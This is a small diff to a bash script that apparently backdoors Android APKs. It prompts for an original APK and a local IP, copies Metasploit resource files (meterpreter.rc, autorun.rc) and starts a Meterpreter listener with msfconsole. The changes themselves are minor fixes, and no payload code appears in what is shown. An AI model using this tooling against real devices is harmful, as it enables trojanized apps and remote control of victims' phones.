@@ -7,7 +7,6 @@ cd P0ison_stuff/
 echo "What is the original apk name (full path please)"
 read -e APK
 echo
-echo
 echo "What is the Local IP?"
 read LOCAL_IP
 echo
@@ -67,10 +66,10 @@ case "$choice" in
 	cp /root/P0ison_stuff/meterpreter.rc ~/;
 	cp /root/P0ison_stuff/autorun.rc ~/;
 	cp /root/P0ison_stuff/open.sh ~/;
-	rm -r -f /root/P0ison_stuff/
+	rm -r -f /root/P0ison_stuff/;
 	msfconsole -r meterpreter.rc;;
   n|N ) echo "Waiting 30 seconds then exiting run 'msfconsole -r meterpreter.rc' to start listening";
-	sleep 5;
+	sleep 30;
 	exit;; 
   * ) echo "invalid";;
 esac
